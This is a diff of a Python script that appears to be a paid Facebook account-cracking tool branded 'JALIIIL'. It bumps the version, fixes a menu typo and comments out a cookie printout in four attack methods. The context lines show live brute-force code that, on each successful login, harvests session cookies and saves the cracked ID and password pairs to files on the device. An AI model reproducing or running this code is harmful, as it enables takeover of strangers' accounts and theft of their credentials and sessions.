@@ -125,7 +125,7 @@ logo=(f"""\x1b[38;5;208m
  \033[1;91mFACEBOOK  : \033[1;36mH. M. JALIL\033[1;37m
  \033[1;91mTELEGRAM  : \033[1;36mITZJALIL0\033[1;37m
  \033[1;91mWHATSAPP  : \033[1;36m213676980481\033[1;37m
- \033[1;91mVERSIONl  : \033[1;36m1.2\033[1;37m
+ \033[1;91mVERSIONl  : \033[1;36m1.3\033[1;37m
  \033[1;91mTOOL      : \033[1;36mPAID\033[1;37m
 \033[1;33m========================================================\033[1;33m
 """)
@@ -159,7 +159,7 @@ def Fof():
 		except FileNotFoundError:
 			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
 			exit()
-		print(f' [\033[1;31m1\033[1;37m] method \033[1;32m1\033[1;37m [\033[1;32MIX IDS\033[1;37m] \n [\033[1;31m2\033[1;37m] Method \033[1;32m2\033[1;37m [\033[1;32mNEW IDS\033[1;37m] \n [\033[1;31m3\033[1;37m] Method \033[1;32m3\033[1;37m [\033[1;32m OLD IDS\033[1;37m] \n [\033[1;31m4\033[1;37m] Method \033[1;32m4\033[1;37m [\033[1;32mACTIVE IDS\033[1;37m]  ')
+		print(f' [\033[1;31m1\033[1;37m] Method \033[1;32m1\033[1;37m [\033[1;32mMIX IDS\033[1;37m] \n [\033[1;31m2\033[1;37m] Method \033[1;32m2\033[1;37m [\033[1;32mNEW IDS\033[1;37m] \n [\033[1;31m3\033[1;37m] Method \033[1;32m3\033[1;37m [\033[1;32mOLD IDS\033[1;37m] \n [\033[1;31m4\033[1;37m] Method \033[1;32m4\033[1;37m [\033[1;32mACTIVE IDS\033[1;37m]  ')
 		mthd=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
 		plist=[]
 		try:
@@ -227,8 +227,8 @@ def m1(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -270,8 +270,8 @@ def m3(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -313,8 +313,8 @@ def m2(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -356,8 +356,8 @@ def m4(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
